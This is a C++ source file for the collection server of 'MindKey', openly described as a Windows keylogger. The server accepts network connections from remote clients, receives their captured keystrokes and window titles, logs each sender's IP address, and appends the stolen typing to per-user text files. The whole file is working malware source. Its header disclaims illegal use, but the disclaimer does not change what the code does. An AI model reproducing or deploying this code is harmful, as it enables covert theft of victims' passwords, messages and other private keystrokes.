/* MindKey, Keylogger for Windows. 
 * While this program can potentially be used for nefarious purposes, 
 * it was written for educational and recreational purposes only
 * and the author does not endorse illegal use.
 *
 * Copyright (C) 2013 Blackhack <https://github.com/blackhack/MindKey/>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "mindKeyServer.h"


void Server::HandleAccept(const boost::system::error_code& e, connection_ptr conn)
{
    if (!e)
        conn->async_read(_stocks, boost::bind(&Server::HandleRead, this, boost::asio::placeholders::error, conn));

    connection_ptr new_conn(new connection(_acceptor.get_io_service()));
    _acceptor.async_accept(new_conn->socket(),
        boost::bind(&Server::HandleAccept, this,
        boost::asio::placeholders::error, new_conn));
}

void Server::HandleRead(const boost::system::error_code& e, connection_ptr conn)
{
    if (!e)
    {
        std::cout << "Update from IP: " << conn->socket().remote_endpoint().address().to_string().c_str() << ", Size: " << _stocks.size() << "\n";
        SaveData(conn);
    }
    else
        std::cerr << "Exeption: " << e.message() << std::endl;
}


void Server::SaveData(connection_ptr conn)
{
    if (_stocks.size() <= 0)
        return;

    time_t currTime = time(NULL);
    std::string stringDate = ctime(&currTime);
    stringDate[stringDate.size()-1] = 0;

    std::string fileName = _stocks[0].User + ".txt";
    std::cout << "Update file: " << fileName.c_str() << "\n";

    std::ofstream myfile;
    myfile.open(fileName.c_str(), std::ios::out | std::ios::app);

    std::string lastTitle = _stocks[0].WindowTitle;

    myfile << "----- BEGIN DATA, DATE: " << stringDate.c_str() << " -----\n";
    myfile << "From: " << conn->socket().remote_endpoint().address().to_string() << "\n";
    myfile << "Title: " << _stocks[0].WindowTitle << "\n";
    myfile << "Data: ";

    for (std::size_t i = 0; i < _stocks.size(); ++i)
    {
        if (_stocks[i].WindowTitle == lastTitle)
            myfile << _stocks[i].Key;
        else
        {
            myfile << "\n----------\n";
            myfile << "Title: " << _stocks[i].WindowTitle << "\n";
            myfile << "Data: ";
            lastTitle = _stocks[i].WindowTitle;
        }
    }
    myfile << "\n----- END DATA -----\n\n";

    myfile.close();
}

int main(int argc, char* argv[])
{
    try
    {
        if (argc != 2)
        {
            std::cerr << "Usage: Server <port>, Standar: 1995" << std::endl;
            return 1;
        }

        unsigned short port = boost::lexical_cast<unsigned short>(argv[1]);

        boost::asio::io_service io_service;
        Server Server(io_service, port);
        io_service.run();
    }
    catch (std::exception& e)
    {
        std::cerr << e.what() << std::endl;
    }

    return 0;
}
